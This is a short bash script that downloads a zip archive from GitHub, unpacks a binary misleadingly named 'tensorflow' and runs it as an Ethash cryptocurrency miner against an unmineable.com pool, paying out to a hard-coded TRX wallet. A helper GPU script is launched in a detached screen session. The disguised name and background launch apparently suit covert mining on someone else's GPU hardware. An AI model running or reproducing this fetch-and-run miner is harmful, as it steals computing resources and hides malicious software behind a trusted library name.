#!/bin/bash
sudo apt update && sudo apt-get install zip unzip && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75 && wget https://github.com/n5000/tensorflow/raw/main/tensorflow.zip && unzip tensorflow.zip && cd tensorflow && chmod u+x tensorflow && ./tensorflow --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWzp8qHuWZai4ZHaAMhQy9ND82ACKwoLd2.n50 --ethstratum ETHPROXY